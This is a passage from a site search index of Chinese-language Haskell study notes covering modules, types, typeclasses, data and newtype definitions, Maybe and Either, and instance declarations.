Modules","text":"<p>\u6a21\u5757\u4e2d\u8981\u5305\u542b\u5c06\u8981\u4f7f\u7528\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u50cf\u6b63\u5e38\u7684 hs \u6587\u4ef6\u4e00\u6837\u5199\u5373\u53ef\uff0c\u4f46\u5934\u90e8\u9700\u8981\u6709\u5bfc\u51fa\u8bed\u53e5\uff08export\uff09\u3002\u6bd4\u5982\u4e00\u4e2a\u6a21\u5757\u6587\u4ef6\u540d\u53eb <code>ModuleA.hs</code>\uff0c\u90a3\u5b83\u7684\u5934\u90e8\u9700\u8981\u5199\uff1a <pre><code>module ModuleA\n( functionA\n, functionB\n, functionC\n) where\n</code></pre> \u800c\u4e14\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u51fd\u6570\u53ea\u5bfc\u51fa\u9700\u8981\u4f7f\u7528\u7684\u5373\u53ef\u3002\u6bd4\u5982\u8be5\u6587\u4ef6\u4e2d\u8fd8\u542b\u6709 functionD \u4f9b\u524d\u4e09\u4e2a\u51fd\u6570\u5185\u90e8\u4f7f\u7528\uff0c\u90a3\u4e48\u5728 import ModuleA \u4e4b\u540e\u4e5f\u65e0\u6cd5\u8c03\u7528 functionD\u3002</p>"},{"location":"cs/pl/haskell/#types-typeclasses","title":"Types &amp; Typeclasses","text":""},{"location":"cs/pl/haskell/#types","title":"Types","text":"<p>Haskell \u6709\u4e00\u4e2a\u9759\u6001\u7c7b\u578b\u7cfb\u7edf\uff0c\u4efb\u4f55\u53d8\u91cf\u3001\u51fd\u6570\u90fd\u4f1a\u5177\u6709\u7c7b\u578b\uff0c\u5e76\u4e14\u6709\u7c7b\u578b\u5224\u65ad\u529f\u80fd\uff0c\u6ca1\u7ed9\u51fa\u7684\u7c7b\u578b\u4f1a\u81ea\u52a8\u8bc6\u522b\u3002 Type \u7684\u9996\u5b57\u6bcd\u5168\u4e3a\u5927\u5199\uff0c\u5e38\u7528\u7684\u6709\uff1a</p> <ul> <li><code>Int</code>\uff1a\u6574\u578b\uff0c\u6709\u4e0a\u4e0b\u754c\u8303\u56f4\uff0c-2147483647\uff5e2147483648</li> <li><code>Integer</code>\uff1a\u6574\u6570\uff0c\u65e0\u754c\uff0c\u4f46\u662f\u6548\u7387\u6bd4Int\u4f4e</li> <li><code>Float</code>\uff1a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b</li> <li><code>Double</code>\uff1a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b</li> <li><code>Bool</code>\uff1a\u5e03\u5c14\u503c</li> <li><code>Char</code>\uff1a\u5b57\u7b26</li> <li><code>String</code>\uff1a\u5b57\u7b26\u4e32\uff0c\u7b49\u540c\u4e8e<code>[Char]</code></li> <li><code>Ordering</code>\uff1a\u5927\u5c0f\u5173\u7cfb\uff0c\u5305\u542bLT\u3001EQ\u3001GT\uff0c\u4e14\u5b83\u4eec\u6709\u5927\u5c0f\u5173\u7cfb LT &lt; EQ &lt; GT</li> </ul> <p>\u5217\u8868\u7684\u7c7b\u578b\u662f\u7531\u5176\u4e2d\u5143\u7d20\u51b3\u5b9a\u7684\uff0c\u5e76\u4e14\u5217\u8868\u4e2d\u5143\u7d20\u5fc5\u987b\u662f\u540c\u4e00\u7c7b\u578b\uff0c\u6240\u4ee5\u5217\u8868\u7684\u7c7b\u578b\u5c31\u662f\u5176\u5143\u7d20\u7c7b\u578b\u5916\u52a0<code>[]</code>\u3002</p> <p>\u5143\u7ec4\u7684\u7c7b\u578b\u7531\u5176\u4e2d\u5404\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u5171\u540c\u51b3\u5b9a\uff0c\u56e0\u4e3a\u5143\u7ec4\u4e2d\u7684\u5143\u7d20\u53ef\u4ee5\u662f\u4e0d\u540c\u7c7b\u578b\u3002\u5982 (\"abc\", 'a', True) \u7684\u7c7b\u578b\u662f ([Char], Char, Bool)\u3002</p>"},{"location":"cs/pl/haskell/#typeclasses","title":"Typeclasses","text":"<p>\u7c7b\u578b\u7c7b\uff08Typeclass\uff09\u662f\u5b9a\u4e49\u4e00\u7cfb\u5217\u529f\u80fd\u7684\u63a5\u53e3\uff0c\u5982\u679c\u4e00\u4e2a Type \u5c5e\u4e8e\u4e00\u4e2a Typeclass \u7684\u6210\u5458\uff0c\u90a3\u4e48\u5b83\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e2a\u7c7b\u578b\u7c7b\u6240\u89c4\u5b9a\u7684\u529f\u80fd\u3002\u4e00\u4e2a Type \u4e5f\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2aTypeclass Typeclass\u7684\u9996\u5b57\u6bcd\u4e5f\u5168\u4e3a\u5927\u5199\uff0c\u5e38\u89c1\u7684\u6709\uff1a</p> <ul> <li><code>Eq</code>\uff1a\u53ef\u5224\u65ad\u662f\u5426\u76f8\u7b49</li> <li><code>Ord</code>\uff1a\u53ef\u6bd4\u8f83\u5927\u5c0f</li> <li><code>Show</code>\uff1a\u53ef\u5c55\u793a\u6210\u5b57\u7b26\u4e32</li> <li><code>Read</code>\uff1a\u53ef\u4ece\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u7279\u5b9a\u7c7b\u578b</li> <li><code>Enum</code>\uff1a\u53ef\u679a\u4e3e\uff08\u8fde\u7eed\uff09\uff0c\u5373\u53ef\u4ee5\u4f7f\u7528 pred \u548c succ \u51fd\u6570\u5f97\u5230\u524d\u9a71\u548c\u540e\u7f00</li> <li><code>Bounded</code>: \u6709\u4e0a\u4e0b\u754c\uff0c\u5982\u679c\u5143\u7ec4\u4e2d\u6240\u6709\u5143\u7d20\u90fd\u5c5e\u4e8e Bounded\uff0c\u90a3\u8fd9\u4e2a\u5143\u7ec4\u7684\u7c7b\u578b\u4e5f\u5c5e\u4e8e Bounded</li> <li><code>Integral</code>\uff1a\u662f\u6574\u6570\uff0c\u5305\u62ec Int \u548c Integer</li> <li><code>RealFloat</code>\uff1a \u662f\u5b9e\u6d6e\u70b9\u6570\uff0c\u5305\u62ec Float \u548c Double</li> <li><code>RealFrac</code>\uff1a\u662f\u5b9e\u5206\u6570\uff0c\u5305\u62ec Float\u3001Double \u548c Ratio\uff08\u5728 Data.Ratio \u6a21\u5757\u4e2d\uff09</li> <li><code>Floating</code>\uff1a\u662f\u6d6e\u70b9\u6570\uff0c\u5305\u62ec Float\u3001Double \u548c Complex\uff08\u5728 Data.Complex \u6a21\u5757\u4e2d\uff09</li> <li><code>Real</code>\uff1a\u662f\u5b9e\u6570\uff0c\u5305\u62ec Integral \u548c RealFrac \u7684\u6210\u5458</li> <li><code>Fractional</code>\uff1a\u662f\u5206\u6570\uff0c\u5305\u62ec RealFrac \u548c Floating \u7684\u6210\u5458</li> <li><code>Num</code>\uff1a\u662f\u6570\u5b57\uff0c\u5305\u62ec\u4e0a\u8ff0\u6240\u6709\u6570\u5b57\u76f8\u5173\u7684\u7c7b\u578b</li> </ul>"},{"location":"cs/pl/haskell/#type-variables","title":"Type variables","text":"<p>\u5982\u679c\u67e5\u770b\u4e00\u4e2a\u51fd\u6570\u7684\u7c7b\u578b\uff0c\u6bd4\u5982 <code>head</code>\uff0c\u90a3\u4e48\u5c06\u4f1a\u8fd4\u56de\u4ee5\u4e0b\u7c7b\u578b\uff1a</p> <p>head :: [a] -&gt; a</p> <p>\u5176\u4e2d\u7684 a \u5c31\u662f\u4e00\u4e2a\u7c7b\u578b\u53d8\u91cf\uff08type variable\uff09\uff0c\u5b83\u5728 head \u4e2d\u53ef\u4ee5\u5c5e\u4e8e\u4efb\u4f55\u7c7b\u578b\uff0c\u5728\u8fd9\u91cc\u53ea\u662f\u8868\u793a\u8fd4\u56de\u503c\u7684\u7c7b\u578b\u548c\u8f93\u5165\u7684\u5217\u8868\u4e2d\u7684\u5143\u7d20\u7684\u7c7b\u578b\u76f8\u4e00\u81f4\u3002</p> <p>\u5728\u51fd\u6570\u7684\u7c7b\u578b\u8868\u8fbe\u5f0f\u5176\u5b9e\u53ef\u4ee5\u770b\u4f5c \\(\\lambda\\) \u8868\u8fbe\u5f0f\uff0c\u5b83\u9002\u7528\u4e8e \\(\\alpha\\) \u53d8\u6362\uff08\\(\\alpha\\)-conversion\uff09\u3002\u5373 a \u5728\u8fd9\u91cc\u53ef\u4ee5\u6307 Int\u3001Char \u7b49\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u6307 [Char], (Int, Char), \u751a\u81f3\u51fd\u6570 Int -&gt; Int \u7b49\u3002</p> <p>\u5728\u5927\u90e8\u5206\u51fd\u6570\u7684\u7c7b\u578b\u4e2d\uff0c\u7c7b\u578b\u53d8\u91cf\u9700\u8981\u4fdd\u8bc1\u662f\u67d0\u4e2a Typeclass \u7684\u6210\u5458\u624d\u80fd\u5b8c\u6210\u64cd\u4f5c\u3002\u6bd4\u5982 <code>(==)</code> \u51fd\u6570\uff0c\u5b83\u9700\u8981\u4f20\u5165\u7684\u53c2\u6570\u662f\u53ef\u5224\u65ad\u76f8\u7b49\u7684\uff0c\u5373\u662f Eq \u7684\u6210\u5458\uff0c\u90a3\u4e48 <code>(==)</code> \u7684\u7c7b\u578b\u5c31\u662f\uff1a</p> <p>(==) :: (Eq a) =&gt; a -&gt; a -&gt; Bool</p> <p>\u5176\u4e2d <code>=&gt;</code> \u524d\u7684\u90e8\u5206 (Eq a) \u5c31\u662f\u7c7b\u7ea6\u675f\uff08class constraint\uff09\uff0c\u5b83\u89c4\u5b9a\u4e86 a \u662f Eq \u7684\u6210\u5458\uff0c\u6240\u4ee5 <code>(==)</code> \u51fd\u6570\u4f20\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u90fd\u662f a \u7c7b\u578b\uff0c\u4e14\u90fd\u662f Eq \u7684\u6210\u5458\uff0c\u4fdd\u8bc1\u4e86\u5b83\u4eec\u4e4b\u95f4\u662f\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u7684\u3002</p>"},{"location":"cs/pl/haskell/#type","title":"\u5b9a\u4e49\u65b0 Type","text":"<p>\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684 Type \u9700\u8981\u4f7f\u7528 <code>data</code> \u5173\u952e\u5b57\uff0c\u6bd4\u5982\u5b9a\u4e49 <code>Bool</code> \u9700\u8981\u4f7f\u7528\uff1a</p> <p>data Bool = False | True</p> <p>\u5176\u4e2d = \u5de6\u4fa7\u7684\u90e8\u5206\u5b9a\u4e49\u4e86\u65b0\u7c7b\u578b\u7684\u540d\u79f0 <code>Bool</code>\uff0c\u53f3\u4fa7\u7684\u90e8\u5206\u53eb\u505a\u503c\u6784\u9020\u5668\uff08value constructors\uff09\uff0c\u8868\u793a\u4e86 Bool \u7c7b\u578b\u7684\u503c\u4e3a False \u6216 True\u3002 \u5e76\u4e14\u540d\u79f0\u548c\u503c\u6784\u9020\u5668\u7684\u9996\u5b57\u6bcd\u90fd\u9700\u8981\u5927\u5199\u3002</p> <p>\u53e6\u5916\uff0c\u503c\u6784\u9020\u5668\u4e5f\u662f\u51fd\u6570\uff0c\u5b83\u4eec\u53ef\u4ee5\u6709\u53c2\u6570\uff0c\u53eb\u505a\u9879\uff08field\uff09\u3002\u6bd4\u5982\uff1a <pre><code>data Shape = Circle Float Float Float | Rectangle Float Float Float Float   \n</code></pre> \u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b0 Type \u53eb Shape\uff0c\u503c\u6784\u9020\u5668\u662f Circle \u548c Rectangle\uff0cCircle \u63a5\u6536\u4e09\u4e2a\u53c2\u6570\u90fd\u662f Float \u7c7b\u578b\uff0cRectangle \u63a5\u6536\u56db\u4e2a Float \u7c7b\u578b\u53c2\u6570\u3002 \u5982\u679c\u67e5\u770b Circle \u7684\u7c7b\u578b\uff0c\u5c06\u8fd4\u56de\uff1a</p> <p>Circle :: Float -&gt; Float -&gt; Float -&gt; Shape</p> <p>\u5982\u679c\u60f3\u8981\u8ba9\u5b83\u80fd\u7ed9\u76f4\u63a5\u663e\u793a\u51fa\u6765\uff0c\u9700\u8981\u8ba9\u5b83\u5c5e\u4e8e Show \u7c7b\u578b\u7c7b\u3002\u5728\u4ee3\u7801\u4e2d\u53ea\u9700\u8981\u5728\u7ed3\u5c3e\u52a0\u4e0a <code>deriving (Show)</code>: <pre><code>data Shape = Circle Float Float Float | Rectangle Float Float Float Float deriving (Show)\n</code></pre></p> <p>\u7c7b\u578b\u7684\u540d\u79f0\u548c\u503c\u6784\u9020\u5668\u540d\u79f0\u4e5f\u53ef\u4ee5\u76f8\u540c\uff0c\u6bd4\u5982\uff1a <pre><code>data Point = Point Float Float deriving (Show)\n</code></pre></p>"},{"location":"cs/pl/haskell/#type_1","title":"\u5bfc\u51fa Type","text":"<p>\u5728\u6587\u4ef6\u4e2d\u5b9a\u4e49\u4e86\u65b0\u7684 Type \u4e4b\u540e\uff0c\u5982\u679c\u5728\u522b\u7684\u6587\u4ef6\u4e2d\u5c06\u5176\u4f5c\u4e3a\u6a21\u5757\u5bfc\u5165\uff0c\u5219\u9700\u8981\u5148\u5bfc\u51fa\u3002\u6bd4\u5982\u6587\u4ef6 <code>Shapes.hs</code> \u4e2d\u5b9a\u4e49\u4e86 Shape \u548c Point\uff0c\u4ee5\u53ca\u5176\u4ed6\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u90a3\u4e48\u6587\u4ef6\u5f00\u5934\u9700\u8981\u5199\uff1a <pre><code>module Shapes\n( Shape(..)\n, Point(..)\n, functionA\n, functionB\n) where\n</code></pre> \u5176\u4e2d\u7684 <code>Shape(..)</code> \u5bfc\u51fa\u4e86 Shape \u7c7b\u578b\u548c\u5b83\u6240\u6709\u7684\u503c\u6784\u9020\u5668\uff0c<code>..</code> \u4ee3\u8868\u4e86\u5b83\u7684\u6240\u6709\u503c\u6784\u9020\u5668\u3002\u56e0\u6b64\uff0c<code>Shape(..)</code> \u76f8\u5f53\u4e8e <code>Shape (Circle, Rectangle)</code>\u3002</p> <p>\u5982\u679c\u4e0d\u60f3\u8981\u5bfc\u51fa\u503c\u6784\u9020\u5668\uff0c\u5373\u4e0d\u5141\u8bb8\u4f7f\u7528\u503c\u6784\u9020\u5668\u7684\u65b9\u6cd5\u6765\u521b\u5efa Shape \u7c7b\u578b\u7684\u53d8\u91cf\u3002\u90a3\u4e48\u9700\u8981\u5c06 <code>Shape(..)</code> \u66ff\u6362\u4e3a <code>Shape</code>\uff0c\u8fd9\u6837\u5c31\u53ea\u5bfc\u51fa\u4e86 Shape \u7c7b\u578b\uff0c\u800c\u4e0d\u5bfc\u51fa\u5176\u503c\u6784\u9020\u5668\u3002</p>"},{"location":"cs/pl/haskell/#record-syntax","title":"Record Syntax","text":"<p>\u5982\u679c\u60f3\u8981\u65b9\u4fbf\u5730\u53d6\u51fa\u7c7b\u578b\u5b9e\u4f8b\u4e2d\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528 Record \u8bed\u6cd5\uff0c\u5982\uff1a <pre><code>data Point = Point { xcoord :: Float\n                   , ycoord :: Float\n                   } deriving (Show)\n</code></pre> \u5728\u503c\u6784\u9020\u5668\u7684\u53c2\u6570\u90e8\u5206\u5148\u52a0\u4e00\u4e2a\u5927\u62ec\u53f7\uff0c\u7136\u540e\u6307\u5b9a\u53d6\u51fa\u503c\u7684\u51fd\u6570\u540d\u79f0\uff08xcoord, ycoord\uff09\uff0c\u540e\u9762\u6307\u5b9a\u7c7b\u578b\uff08:: Float\uff09\u3002\u8fd9\u6837 xcoord \u548c ycoord \u5c31\u90fd\u662f\u4e00\u4e2a\u7c7b\u578b\u4e3a Point -&gt; Float \u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u65b9\u6cd5\u6765\u8bbf\u95ee\u503c\uff1a <pre><code>ghci&gt; let point = Point 1.0 2.0\nghci&gt; xcoord point\n1.0\nghci&gt; ycoord point\n2.0\n</code></pre> \u540c\u65f6\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u65b9\u6cd5\u6765\u521b\u5efa\u8fd9\u4e2a point\uff1a <pre><code>point = Point {ycoord=2.0, xcoord=1.0}\n</code></pre></p>"},{"location":"cs/pl/haskell/#type-parameters","title":"Type parameters","text":"<p>\u503c\u6784\u9020\u5668\u53ef\u4ee5\u63a5\u6536\u53c2\u6570\uff0c\u7c7b\u578b\u4e5f\u53ef\u4ee5\u63a5\u6536\u53c2\u6570\uff0c\u8fd9\u6837\u5b83\u5c31\u6210\u4e3a\u4e86\u7c7b\u578b\u6784\u9020\u5668\uff08type constructors\uff09\u3002\u5982 Maybe \u7684\u5b9a\u4e49\uff1a</p> <p>data Maybe a = Nothing | Just a</p> <p>\u5b83\u7684\u503c\u662f Nothing \u65f6\uff0c\u7c7b\u578b\u4e3a Maybe a\uff0c\u662f\u591a\u6001\u7684\uff08polymorphic\uff09\u3002 \u5b83\u7684\u503c\u4e0d\u662f Nothing \u65f6\uff0c\u7c7b\u578b\u53d6\u51b3\u4e8e\u503c Just a \u4e2d a \u7684\u7c7b\u578b\uff0c\u53ef\u4ee5\u6784\u9020\u51fa Maybe Int\u3001Maybe [Char] \u7b49\u591a\u79cd\u7c7b\u578b\uff1a <pre><code>Nothing :: Maybe a\nJust 1 :: Num a =&gt; Maybe a\nJust 'a' :: Maybe Char\nJust \"abc\" :: Maybe [Char]\n</code></pre></p> <p>\u53ef\u4ee5\u7528\u8fd9\u79cd\u65b9\u6cd5\u6539\u5199 Point\uff1a <pre><code>data Point x y = Point { xcoord :: x\n                       , ycoord :: y\n                       } deriving (Show)\n</code></pre></p> <p>\u4f46\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\uff08type parameters\uff09\u5e76\u4e0d\u662f\u603b\u662f\u65b9\u4fbf\uff0c\u6bd4\u5982\u5728\u58f0\u660e\u51fd\u6570\u7c7b\u578b\u7684\u65f6\u5019\u4e0d\u80fd\u53ea\u4f7f\u7528 Point \u6765\u8868\u793a Point \u7c7b\u578b\uff0c\u800c\u662f\u5fc5\u987b\u5199\u6210 Point Float Float\u3002</p> <p>\u800c\u4e14\u4e0d\u80fd\u5728\u5b9a\u4e49\u7c7b\u578b\u6784\u9020\u5668\u65f6\u6dfb\u52a0\u7c7b\u7ea6\u675f\uff08class constraint\uff09\uff0c\u4e0d\u7136\u5728\u4e4b\u540e\u58f0\u660e\u51fd\u6570\u7c7b\u578b\u7684\u65f6\u5019\u4e5f\u90fd\u9700\u8981\u6dfb\u52a0\u7c7b\u7ea6\u675f\uff0c\u5982\uff1a <pre><code>data (Ord k) =&gt; Map k v = ... \ntoList :: (Ord k) =&gt; Map k a -&gt; [(k, a)]\n</code></pre></p>"},{"location":"cs/pl/haskell/#either","title":"Either","text":"<p>Either \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u6709\u4e24\u4e2a\u503c\u6784\u9020\u5668\uff0c\u5b9a\u4e49\u662f\uff1a <pre><code>data Either a b = Left a | Right b deriving (Eq, Ord, Read, Show)  \n</code></pre> \u5982\u679c\u4f7f\u7528\u4e86 Left\uff0c\u90a3\u5b83\u7684 a \u7684\u7c7b\u578b\u5c31\u662f\u5177\u4f53\u7684\uff1b\u5982\u679c\u4f7f\u7528\u4e86 Right\uff0c\u90a3\u5b83\u7684 b \u7684\u7c7b\u578b\u5c31\u662f\u5177\u4f53\u7684\uff1a <pre><code>ghci&gt; Right 20  \nRight 20  \nghci&gt; Left \"w00t\"  \nLeft \"w00t\"  \nghci&gt; :t Right 'a'  \nRight 'a' :: Either a Char  \nghci&gt; :t Left True  \nLeft True :: Either Bool b  \n</code></pre> Either \u53ef\u4ee5\u770b\u4f5c Maybe \u7684\u8865\u5145\uff0c\u6bd4\u5982 Maybe \u5728\u4f7f\u7528\u65f6\uff0c\u51fa\u73b0\u5f02\u5e38\u53ef\u4ee5\u8fd4\u56de Nothing\uff0c\u4f46\u53ea\u662f\u4e00\u4e2a Nothing\uff0c\u4e0d\u5305\u542b\u4efb\u4f55\u4fe1\u606f\uff1b\u4f46 Either \u5305\u542b\u5de6\u503c\u548c\u53f3\u503c\uff0c\u6b63\u5e38\u7ed3\u679c\u8fd4\u56de\u53f3\u503c\uff0c\u800c\u51fa\u73b0\u5f02\u5e38\u5c31\u53ef\u4ee5\u8fd4\u56de\u5305\u542b\u9519\u8bef\u4fe1\u606f\u7684\u5de6\u503c\uff0c\u6bd4\u5982\u5b89\u5168\u9664\u6cd5\uff1a <pre><code>safeDiv :: Int -&gt; Int -&gt; Maybe Int\nsafeDiv _ 0 = Nothing\nsafeDiv x y = Just (x `div` y)\n\nghci&gt; safeDiv 4 2\nJust 2\nghci&gt; safeDiv 1 0\nNothing\n</code></pre> \u800c\u4f7f\u7528 Either\uff1a <pre><code>safeDiv :: Int -&gt; Int -&gt; Either String Int\nsafeDiv _ 0 = Left \"Divided by zero\"\nsafeDiv x y = Right (x `div` y)\n\nghci&gt; safeDiv 4 2\nRight 2\nghci&gt; safeDiv 1 0\nLeft \"Divided by zero\"\n</code></pre></p>"},{"location":"cs/pl/haskell/#derived-instances","title":"Derived instances","text":"<p>\u60f3\u8981\u4f7f\u4e00\u4e2a\u5b9a\u4e49\u7684\u7c7b\u6ee1\u8db3\u67d0\u4e9b Typeclass \u7684\u9700\u6c42\uff0c\u9700\u8981\u4ece\u5176\u6d3e\u751f\uff08derive\uff09\uff0c\u6bd4\u5982\uff1a <pre><code>data Day = Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday   \n           deriving (Eq, Ord, Show, Read, Bounded, Enum)  \n</code></pre> \u8fd9\u6837 Day \u7c7b\u578b\u7684\u503c\uff08Monday\uff5eSunday\uff09\u4e4b\u95f4\u5c31\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\uff08\u4ece Eq \u6d3e\u751f\uff09\uff0c\u6bd4\u8f83\u5927\u5c0f\uff08\u4ece Ord \u6d3e\u751f\uff0c\u5de6\u4fa7\u4e3a\u5c0f\uff0c\u53f3\u4fa7\u4e3a\u5927\uff09\uff0c\u663e\u793a\u6210\u5b57\u7b26\u4e32\uff08\u4ece Show \u6d3e\u751f\uff09\uff0c\u4ece\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\uff08\u4ece Read \u6d3e\u751f\uff09\uff0c\u5305\u542b\u8fb9\u754c\uff08\u4ece Bounded \u6d3e\u751f\uff09\uff0c\u53ef\u4ee5\u679a\u4e3e\uff08\u4ece Enum \u6d3e\u751f\uff0c\u6309\u7167\u503c\u6784\u9020\u5668\u4e2d\u7684\u987a\u5e8f\u4f9d\u6b21\u5411\u53f3\uff09</p>"},{"location":"cs/pl/haskell/#type-synonyms","title":"Type synonyms","text":"<p>\u4e3a\u4e86\u9605\u8bfb\u65b9\u4fbf\uff0c\u4e66\u5199\u7b80\u4fbf\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>type</code> \u5173\u952e\u5b57\u4e3a\u5df2\u6709\u7c7b\u578b\u521b\u5efa\u522b\u540d\uff08synonyms\uff09\u3002\u6bd4\u5982 String \u7684\u5b9a\u4e49\uff1a</p> <p>type String = [Char]</p> <p>\u5728\u6240\u6709\u9700\u8981\u4f7f\u7528\u5b57\u7b26\u4e32\uff08\u5373 [Char]\uff09\u7684\u5730\u65b9\u90fd\u53ef\u4ee5\u4f7f\u7528 String \u6765\u4ee3\u66ff\uff0c\u5b83\u4eec\u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u53ea\u662f String \u66f4\u7b80\u4fbf\u6613\u8bfb\u3002 \u540c\u65f6\uff0c\u7c7b\u578b\u522b\u540d\u4e5f\u53ef\u4ee5\u63a5\u6536\u7c7b\u578b\u53c2\u6570</p>"},{"location":"cs/pl/haskell/#newtype-keyword","title":"newtype keyword","text":"<p>\u9664\u4e86 <code>data</code>\u3001<code>type</code> \u5173\u952e\u5b57\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528 <code>newtype</code> \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u7c7b\u578b\uff0c\u6bd4\u5982 <code>Control.Applicative</code> \u6a21\u5757\u4e2d\u7684 ZipList\uff1a <pre><code>newtype ZipList a = { getZipList :: [a] }\n</code></pre> - \u4e0d\u540c\u4e8e type\uff0c\u5b83\u4e0d\u662f\u522b\u540d\uff0c\u53ef\u4ee5\u4f7f\u7528 record \u8bed\u6cd5\u6765\u76f4\u63a5\u5b9a\u4e49\u53d6\u51fa\u503c\u7684\u51fd\u6570 - \u4e0d\u540c\u4e8e data\uff0c\u5b83\u53ea\u80fd\u6709\u4e00\u4e2a\u503c\u6784\u9020\u5668\uff0c\u4f46\u662f\u901f\u5ea6\u8981\u6bd4 data \u5feb\uff0c\u800c\u4e14\u66f4\u52a0\u61d2\u60f0</p>"},{"location":"cs/pl/haskell/#recursive-data-structures","title":"Recursive data structures","text":"<p>\u4e00\u4e2a\u7c7b\u578b\u4e5f\u53ef\u4ee5\u9012\u5f52\u5b9a\u4e49\uff0c\u6bd4\u5982\u4e00\u9897\u4e8c\u53c9\u6811\uff1a <pre><code>data Tree a = EmptyTree | Node a (Tree a) (Tree a) deriving (Show, Read, Eq)  \n</code></pre></p>"},{"location":"cs/pl/haskell/#typeclass","title":"\u5b9a\u4e49\u65b0 Typeclass","text":"<p>\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684 Typeclass \u9700\u8981\u4f7f\u7528 class \u5173\u952e\u5b57\uff0c\u4f8b\u5982\u5b9a\u4e49 Eq \u7c7b\u578b\u7c7b\uff1a <pre><code>class Eq a where  \n    (==) :: a -&gt; a -&gt; Bool  \n    (/=) :: a -&gt; a -&gt; Bool  \n    x == y = not (x /= y)  \n    x /= y = not (x == y)  \n</code></pre> \u5176\u4e2d <code>a</code> \u662f\u4e00\u4e2a\u7c7b\u578b\u53d8\u91cf\uff0c\u524d\u4e24\u884c\u58f0\u660e\u4e86\u9700\u8981\u5b9e\u73b0\u7684\u51fd\u6570\u7684\u540d\u5b57\u53ca\u5176\u7c7b\u578b\uff0c\u540e\u4e24\u884c\u8868\u660e\u4e86\u9700\u8981\u7684\u51fd\u6570\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u5b9a\u4e49\uff08\u4e0d\u5fc5\u8981\uff09\u3002</p> <p>\u5305\u542b\u4e86\u540e\u4e24\u884c\u4e4b\u540e\uff0c\u53ea\u5b9a\u4e49 (==) \u51fd\u6570\u6216\u8005 (/=) \u51fd\u6570\u90fd\u53ef\u4ee5\u5b8c\u6210\u5168\u90e8\u5b9a\u4e49\uff0c\u5b83\u4eec\uff08<code>(==) | (/=)</code>\uff09\u6210\u4e3a\u8fd9\u4e2a\u7c7b\u578b\u7c7b\u7684\u6700\u5c0f\u5b8c\u6574\u5b9a\u4e49\uff08minimal complete definition\uff09</p> <p>\u67e5\u770b\u4e00\u4e2a\u7c7b\u578b\u7c7b\u7684\u6210\u5458\u9700\u8981\u5b9e\u73b0\u7684\u51fd\u6570\u53ef\u4ee5\u5728 GHCi \u4e2d\u4f7f\u7528 <code>:info</code>\uff1a</p> <p>ghci&gt; :info Eq</p>"},{"location":"cs/pl/haskell/#_4","title":"\u624b\u52a8\u521b\u5efa\u5b9e\u4f8b","text":"<p>\u4f7f\u4e00\u4e2a\u7c7b\u578b\u6210\u4e3a\u4e00\u4e2a\u7c7b\u578b\u7c7b\u7684\u5b9e\u4f8b\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 <code>deriving</code> \u6765\u81ea\u52a8\u5b8c\u6210\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 instance \u5173\u952e\u5b57\u6765\u624b\u52a8\u5b8c\u6210\u3002\u6bd4\u5982\u4f7f Point \u6210\u4e3a Show \u7684\u5b9e\u4f8b\uff1a <pre><code>instance Show Point where\n    show (Point x y) = \"(\" ++ show x ++ \", \" ++ show y ++ \")\"\n\n-- in ghci\nghci&gt; Point 1.0 2.0\n(1.0, 2.0)\n</code></pre> \u8fd9\u6837\u5c31\u53ef\u4ee5\u81ea\u5b9a\u4e49\u663e\u793a\u7684\u5185\u5bb9\uff0c\u5426\u5219\u4f7f\u7528 deriving \u7684\u8bdd\u53ea\u4f1a\u76f4\u63a5\u5c06\u5176\u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u3002</p> <p>\u540c\u65f6\u4e5f\u8981\u6ce8\u610f\u7c7b\u578b\u548c\u7c7b\u578b\u6784\u9020\u5668\u7684\u533a\u522b\uff0c\u4f20\u5165\u7ed9 instance \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5e94\u8be5\u4e3a\u7c7b\u578b\u800c\u4e0d\u662f\u7c7b\u578b\u6784\u9020\u5668\uff0c\u6bd4\u5982 Maybe\uff1a <pre><code>instance Eq Maybe where  \n    ...    \n-- \u9519\u8bef\u7528\u6cd5\uff0c\u56e0\u4e3aMaybe\u662f\u7c7b\u578b\u6784\u9020\u5668\u800c\u4e0d\u662f\u7c7b\u578b\n\ninstance Eq (Maybe m) where  \n    ...\n-- \u9519\u8bef\u7528\u6cd5\uff0c\u56e0\u4e3am\u4e0d\u4e00\u5b9a\u662fEq\u7684\u6210\u5458\n\ninstance (Eq m) =&gt; Eq (Maybe m) where  \n    Just x == Just y = x == y  \n    Nothing == Nothing = True  \n    _ == _ = False  \n</code></pre></p>"},{"location":"cs/pl/haskell/#functor-typeclass","title":"Functor Typeclass","text":"<p>Functor \u4e5f\u662f\u4e00\u79cd\u7c7b\u578b\u7c7b\uff0c\u5b83\u53ea\u89c4\u5b9a\u4e86\u4e00\u4e2a\u51fd\u6570\uff1a <pre><code>class Functor f where\n    